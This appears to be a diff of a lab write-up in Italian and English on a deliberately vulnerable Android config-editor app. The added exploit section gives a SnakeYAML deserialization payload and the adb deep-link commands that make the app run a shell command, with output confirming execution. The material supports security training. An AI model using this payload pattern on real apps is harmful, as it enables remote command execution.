@@ -31,6 +31,8 @@ Considerazioni sul file `AndroidManifest.xml`
     <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
 ```
 
+### Implicitly Exported Component
+
 An implicitly exported component could allow access to the component Activity, MainActivity.
 In questo caso, l'applicazione gestirà i link con scheme `file://`, `http://` e `https://` e file con estensione  `.yaml`
 
@@ -52,6 +54,20 @@ In questo caso, l'applicazione gestirà i link con scheme `file://`, `http://` e
         </activity>
 ```
 
+### MainActivity
+
++ Look into MainActivity and what happen
+
+### SnakeYAML
+
++ SnakeYaml CVE
+
+### SemGrep
+
++ SemGrep Rules
+
+## Dynamic Analysis
+
 Sanity check:
 
 1. Crea un file `yaml`
@@ -60,25 +76,30 @@ Sanity check:
 L'applicazione dovrebbe aprirsi e tenterà di leggere il file (se vuoto, l'output sarà vuoto)
 
 Commands:
+
 ```sh
 $linux> touch example.yaml
 $linux> python3 -m http.server 8080
 $linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/example.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
 ```
 
-
-+ Look into MainActivity and what happen
-+ SnakeYaml CVE
-+ Fast Analysis CVE
-+ SemGrep Rules
-
-## Dynamic Analysis
-
-+ Test DeepLink and what happen with yaml
-
 ## Exploiting
 
-+ Adapt exploit to Android Env + Gadget Sink and how to discover
+```yaml
+pwn: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [ "/bin/touch /data/data/com.mobilehackinglab.configeditor/pwn.txt" ]
+```
+
+```sh
+$linux> touch pwn.yaml
+$linux> python3 -m http.server 8080
+$linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/pwn.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
+$linux> adb shell ls /data/data/com.mobilehackinglab.configeditor
+output: pwn.txt # in listing file
+```
+
+<p align="center">
+<img src="assets/pwn.png" width="350"/>
+</p>
 
 ## Shell is the way
 
